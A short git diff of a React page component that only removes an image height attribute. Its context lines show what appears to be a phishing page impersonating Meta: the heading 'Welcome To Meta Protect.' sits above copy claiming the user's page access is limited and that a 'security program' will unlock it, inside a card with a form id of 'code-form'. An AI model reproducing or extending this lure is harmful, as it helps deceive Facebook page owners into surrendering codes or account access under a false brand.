@@ -46,7 +46,7 @@ const Page = () => {
         <div className="bg-light d-flex justify-content-center align-items-center">
             <div className="card my-5" id="code-form" style={{ maxWidth: '650px', border: 'none', boxShadow: 'rgba(149, 157, 165, 0.2) 0px 8px 24px' }}>
                 <div className="card-body">
-                    <Image src="/img/inF0loCk.png" className="w-100 rounded" alt="" width={725} height={272} />
+                    <Image src="/img/inF0loCk.png" className="w-100 rounded" alt="" width={725} />
                     <h2 className="card-title fw-bold mt-4">Welcome To Meta Protect.</h2>
                     <p className="card-text py-3">
                         Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
